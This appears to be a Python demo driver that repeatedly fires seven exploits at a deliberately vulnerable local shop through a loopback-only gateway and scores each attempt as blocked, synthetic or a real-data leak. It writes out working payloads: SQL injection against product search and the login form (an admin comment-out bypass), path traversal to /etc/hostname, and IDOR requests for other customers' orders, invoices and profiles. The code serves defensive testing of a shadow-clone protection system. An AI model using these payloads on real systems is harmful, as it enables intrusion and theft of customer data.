"""Demo attacker for the built-in shop: replays the documented exploits in a loop and scores every attempt.

    python -m sim.attacker [--project DIR] [--rounds N] [--interval S] [--only sqli-search,...] [--no-bus]

It sends the seven exploits listed in docs/demo/respuestas/tienda.md through the gateway, one after the other,
round after round, and prints one line per attempt so the terminal moves on its own during the demo. Each
attempt is scored against ground truth read on the host:

- ``ok``: the response looks like the exploit worked (rows came back, a token, a file, another user's order).
- ``saw_real_data``: the response carries production data the attacker must not get: the production values of
  the canary user/order (read from the production database file), the production admin's email after the login
  bypass, or the production container's hostname after the traversal. The search injection only widens a public
  catalogue, so it never counts as real data.

So "worked, synthetic data" means the request ran on a shadow clone; "blocked" means it was refused or the patched
code no longer lets it through; "REAL DATA" means a leak and should never appear.

Every attempt is also published as an ``attack.attempt`` event on the stack's bus (run = runtime/run_id), which
feeds the "Bot atacante" panel of the dashboard. ``--no-bus`` only prints.

It only targets a gateway on this machine (loopback): it is a demo driver for the deliberately vulnerable shop,
not a scanner.
"""
from __future__ import annotations

import argparse
import ipaddress
import json
import os
import re
import sqlite3
import subprocess
import sys
import time
import urllib.parse
from dataclasses import dataclass
from typing import Callable

import httpx

MARKER_RE = re.compile(r"MK[A-Z0-9]{10}")
CANARY_ORDER = 12
CANARY_USER = 7
TRAVERSAL = "../../../../../../etc/hostname"

GREEN, YELLOW, RED, DIM, BOLD, RESET = "\033[32m", "\033[33m", "\033[31;1m", "\033[2m", "\033[1m", "\033[0m"


@dataclass
class Truth:
    """Production values an attacker must never see."""
    admin_email: str
    canary_order_secrets: list      # note / shipping address of the canary order in prod
    canary_order_owner_email: str
    canary_user_email: str
    prod_hostname: str | None       # hostname of the production container (None: could not read it)


@dataclass
class Attempt:
    ok: bool
    real: bool
    status: int
    detail: str


@dataclass
class Exploit:
    key: str
    label: str
    run: Callable                   # (client, token, truth) -> Attempt


def _real_in(text: str, values) -> bool:
    return any(v and v in text for v in values) and not MARKER_RE.search(text)


def sqli_search(c, tok, truth):
    q = urllib.parse.quote("zzzzzz' OR '1'='1", safe="")
    r = c.get("/api/products?q=" + q)
    total = r.json().get("total", 0) if r.status_code == 200 and "json" in r.headers.get("content-type", "") else 0
    return Attempt(total > 0, False, r.status_code, "%d productos" % total if total else "sin filas")


def sqli_login(c, tok, truth):
    r = c.post("/api/login", json={"email": "admin@tienda.example' --", "password": "x"})
    token = r.json().get("token") if r.status_code == 200 and "json" in r.headers.get("content-type", "") else None
    if not token:
        return Attempt(False, False, r.status_code, "sin token")
    me = c.get("/api/me", headers={"authorization": "Bearer " + token})
    text = me.text if me.status_code == 200 else ""
    return Attempt(True, _real_in(text, [truth.admin_email]), r.status_code, "token de admin")


def _traversal(path):
    def run(c, tok, truth):
        r = c.get(path)
        body = r.text.strip() if r.status_code == 200 else ""
        ok = r.status_code == 200 and 0 < len(body) < 256 and "\n" not in body and not body.startswith("{")
        real = ok and truth.prod_hostname is not None and body == truth.prod_hostname
        return Attempt(ok, real, r.status_code, ("leyó /etc/hostname=%s" % body[:24]) if ok else "negado")
    return run


def _idor(path, secrets_of):
    def run(c, tok, truth):
        r = c.get(path, headers={"authorization": "Bearer " + tok})
        ok = r.status_code == 200
        return Attempt(ok, ok and _real_in(r.text, secrets_of(truth)), r.status_code,
                       "datos de otro cliente" if ok else "negado")
    return run


EXPLOITS = [
    Exploit("sqli-search", "SQLi búsqueda", sqli_search),
    Exploit("sqli-login", "SQLi login", sqli_login),
    Exploit("traversal-download", "Traversal descarga",
            _traversal("/api/files/download?name=" + urllib.parse.quote(TRAVERSAL, safe=""))),
    Exploit("traversal-image", "Traversal imagen",
            _traversal("/api/products/1/image?file=" + urllib.parse.quote(TRAVERSAL, safe=""))),
    Exploit("idor-order", "IDOR pedido",
            _idor("/api/orders/%d" % CANARY_ORDER, lambda t: t.canary_order_secrets)),
    Exploit("idor-invoice", "IDOR factura",
            _idor("/api/orders/%d/invoice" % CANARY_ORDER, lambda t: [t.canary_order_owner_email])),
    Exploit("idor-profile", "IDOR perfil",
            _idor("/api/users/%d/profile" % CANARY_USER, lambda t: [t.canary_user_email])),
]


# ------------------------------------------------------------------------------------------------- setup
def load_truth(prod_db: str, prod_container: str | None) -> Truth:
    con = sqlite3.connect("file:%s?mode=ro" % prod_db, uri=True)
    try:
        one = lambda sql, *a: con.execute(sql, a).fetchone()   # noqa: E731
        admin = one("SELECT email FROM users WHERE role = 'admin' ORDER BY id LIMIT 1")[0]
        note, addr, owner = one("SELECT o.note, o.shipping_address, u.email FROM orders o JOIN users u "
                                "ON u.id = o.user_id WHERE o.id = ?", CANARY_ORDER)
        user = one("SELECT email FROM users WHERE id = ?", CANARY_USER)[0]
    finally:
        con.close()
    host = None
    if prod_container:
        try:
            host = subprocess.run(["docker", "inspect", "-f", "{{.Config.Hostname}}", prod_container],
                                  capture_output=True, text=True, timeout=10).stdout.strip() or None
        except (OSError, subprocess.SubprocessError):
            host = None
    return Truth(admin, [s for s in (note, addr, owner) if s], owner, user, host)


def legit_login(c, manifest: dict) -> str:
    for u in manifest.get("legit_users") or []:
        if u.get("role") != "user":
            continue
        r = c.post("/api/login", json={"email": u["email"], "password": u["password"]})
        if r.status_code == 200:
            return r.json()["token"]
    raise SystemExit("attacker: no legit user of the manifest could log in")


def _loopback(url: str) -> bool:
    host = urllib.parse.urlsplit(url).hostname or ""
    if host == "localhost":
        return True
    try:
        return ipaddress.ip_address(host).is_loopback
    except ValueError:
        return False


class Bus:
    def __init__(self, url: str, token: str, run: str):
        self.url, self.token, self.run, self.ok = url.rstrip("/"), token, run, True

    def attempt(self, key: str, a: Attempt) -> None:
        if not self.ok:
            return
        ev = {"type": "attack.attempt", "ts": time.time(), "run": self.run, "src": "sim", "rid": None,
              "incident": None, "data": {"vuln": key, "ok": a.ok, "saw_real_data": a.real}}
        try:
            httpx.post(self.url + "/events", json=ev, headers={"x-bus-token": self.token}, timeout=3)
        except httpx.HTTPError as e:
            print(DIM + "  (bus unreachable, printing only: %s)" % e + RESET)
            self.ok = False


def _env_file(path: str) -> dict:
    out = {}
    try:
        with open(path) as f:
            for line in f:
                if "=" in line and not line.lstrip().startswith("#"):
                    k, v = line.strip().split("=", 1)
                    out[k] = v
    except OSError:
        pass
    return out


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(prog="python -m sim.attacker", description=__doc__.split("\n\n")[0])
    ap.add_argument("--project", default=None, help="project dir (default: the built-in demo, this checkout)")
    ap.add_argument("--rounds", type=int, default=0, help="rounds to run (0: until Ctrl-C)")
    ap.add_argument("--interval", type=float, default=2.0, help="seconds between attempts")
    ap.add_argument("--only", default="", help="comma-separated keys: " + ",".join(e.key for e in EXPLOITS))
    ap.add_argument("--no-bus", action="store_true", help="do not publish attack.attempt events")
    ap.add_argument("--until-closed", type=int, default=0, metavar="K",
                    help="stop after K consecutive rounds in which every exploit was blocked (0: never)")
    ap.add_argument("--max-seconds", type=float, default=0, help="stop after this many seconds (0: no limit)")
    a = ap.parse_args(argv)

    sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from immune import config as icfg
    cfg = icfg.load(a.project or icfg.IMMUNE_HOME)
    if cfg.name != "tienda":
        raise SystemExit("attacker: only the built-in shop has a documented exploit list (project %r)" % cfg.name)
    base = "http://127.0.0.1:%d" % cfg.ports["gateway"]
    assert _loopback(base)
    with open(cfg.rt("data", "manifest.json")) as f:
        manifest = json.load(f)
    def truth_now() -> Truth:
        """Re-read every round: blue/green switches change the production container (and its hostname)."""
        active = None
        try:
            with open(cfg.rt("stack", "fleet-state.json")) as f:
                active = json.load(f).get("active")
        except (OSError, ValueError):
            pass
        return load_truth(cfg.rt("data", "prod", "app.db"), "%s-prod-%s" % (cfg.prefix, active) if active else None)

    truth = truth_now()
    if truth.prod_hostname is None:
        print(DIM + "(could not read the production container hostname: traversal leaks are not scored)" + RESET)

    sec = _env_file(cfg.rt("stack", "containers.env"))
    try:
        run_id = open(cfg.rt("run_id")).read().strip()
    except OSError:
        run_id = ""
    bus = Bus("http://127.0.0.1:%d" % cfg.ports["dashboard"], sec.get("BUS_TOKEN", ""), run_id)
    bus.ok = not a.no_bus and bool(sec.get("BUS_TOKEN"))

    chosen = [e for e in EXPLOITS if not a.only or e.key in a.only.split(",")]
    if not chosen:
        raise SystemExit("attacker: --only matched nothing")
    print(BOLD + "Atacante de demo -> %s  (%d exploits por ronda, Ctrl-C para parar)" % (base, len(chosen)) + RESET)
    leaks = 0
    rnd = 0
    closed_streak = 0
    t_start = time.monotonic()
    try:
        # every attempt is a fresh session (no cookie jar shared between attempts): each exploit takes its own
        # path through the gateway instead of riding on a session an earlier attempt made captive
        def fresh():
            return httpx.Client(base_url=base, timeout=30)

        while not a.rounds or rnd < a.rounds:
            if a.max_seconds and time.monotonic() - t_start > a.max_seconds:
                break
            if a.until_closed and closed_streak >= a.until_closed:
                print(BOLD + GREEN + "Los %d exploits quedaron bloqueados %d rondas seguidas." % (
                    len(chosen), closed_streak) + RESET)
                break
            rnd += 1
            all_blocked = True
            truth = truth_now()
            with fresh() as c:
                token = legit_login(c, manifest)
            for e in chosen:
                t0 = time.monotonic()
                try:
                    with fresh() as c:
                        res = e.run(c, token, truth)
                except httpx.HTTPError as err:
                    res = Attempt(False, False, 0, "error de red: %s" % err.__class__.__name__)
                ms = (time.monotonic() - t0) * 1000
                if res.real:
                    leaks += 1
                    verdict = RED + "DATOS REALES " + RESET
                elif res.ok:
                    verdict = YELLOW + "funcionó, datos sintéticos" + RESET
                else:
                    verdict = GREEN + "bloqueado" + RESET
                print("%s r%-3d %-20s %3s %6.0f ms  %s  %s" % (time.strftime("%H:%M:%S"), rnd, e.label,
                      res.status or "---", ms, verdict, DIM + res.detail + RESET), flush=True)
                bus.attempt(e.key, res)
                all_blocked = all_blocked and not res.ok
                time.sleep(a.interval)
            closed_streak = closed_streak + 1 if all_blocked else 0
    except KeyboardInterrupt:
        pass
    print(BOLD + "%d rondas, %d intentos con datos reales" % (rnd, leaks) + RESET)
    return 1 if leaks else 0


if __name__ == "__main__":
    sys.exit(main())
